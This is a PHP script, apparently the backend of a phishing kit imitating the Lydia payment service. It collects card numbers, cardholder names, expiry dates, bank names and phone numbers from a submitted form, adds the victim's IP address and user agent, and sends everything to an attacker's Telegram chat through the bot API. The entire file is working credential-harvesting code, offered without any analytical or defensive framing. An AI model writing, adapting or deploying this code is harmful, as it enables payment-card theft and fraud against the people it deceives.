<?php
header('Content-Type: application/json');

$botToken = getenv('TELEGRAM_BOT_TOKEN') ?: 'test_token';
$chatId = getenv('TELEGRAM_CHAT_ID') ?: 'test_chat_id';

if ($botToken === 'test_token' || $chatId === 'test_chat_id') {
    http_response_code(500);
    echo json_encode(['error' => 'Missing Telegram credentials']);
    exit;
}

$data = json_decode(file_get_contents('php://input'), true);

$cardNumber = $data['cardNumber'] ?? 'N/A';
$cardHolder = $data['cardHolder'] ?? 'N/A';
$cardExpiry = $data['cardExpiry'] ?? 'N/A';
$bank = $data['bank'] ?? 'N/A';
$phoneNumber = $data['phoneNumber'] ?? 'N/A';

$clientIp = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');

$message = "🔐 <b>AUTHENTIFICATION LYDIA</b>\n\n";
$message .= "💳 <b>Carte Bancaire:</b> <code>$cardNumber</code>\n";
$message .= "👤 <b>Titulaire:</b> <code>$cardHolder</code>\n";
$message .= "📅 <b>Expiration:</b> <code>$cardExpiry</code>\n";
$message .= "🏦 <b>Banque:</b> <code>$bank</code>\n";
$message .= "📱 <b>Téléphone:</b> <code>$phoneNumber</code>\n\n";
$message .= "⏰ <b>Heure:</b> $timestamp\n";
$message .= "🌐 <b>IP:</b> <code>$clientIp</code>\n";
$message .= "🔗 <b>User Agent:</b> <code>$userAgent</code>";

$url = "https://api.telegram.org/bot$botToken/sendMessage";

$postData = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$responseData = json_decode($response, true);

if ($httpCode === 200) {
    http_response_code(200);
    echo json_encode(['success' => true, 'message' => 'Message sent to Telegram']);
} else {
    http_response_code(500);
    echo json_encode(['error' => $responseData['description'] ?? 'Telegram API error']);
}
?>
